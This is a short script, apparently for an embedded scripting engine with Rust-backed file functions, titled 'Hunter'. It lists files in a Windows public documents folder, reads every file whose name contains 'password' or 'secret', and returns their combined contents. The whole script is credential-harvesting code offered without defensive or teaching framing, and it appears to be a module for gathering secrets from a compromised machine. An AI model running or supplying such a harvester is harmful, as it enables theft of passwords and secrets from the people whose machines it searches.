print("Starting Hunter...");

// Use internal_ls (Rust WalkDir) to get file list
let files_str = internal_ls("C:\\Users\\Public\\Documents");
let files = files_str.split('\n');
let found_data = "";

for file in files {
    if file.contains("password") || file.contains("secret") {
        let content = internal_read(file);
        found_data = found_data + "\n--- " + file + " ---\n" + content;
    }
}

if found_data.len() > 0 {
    return found_data;
} else {
    return "No secrets found in public docs.";
}
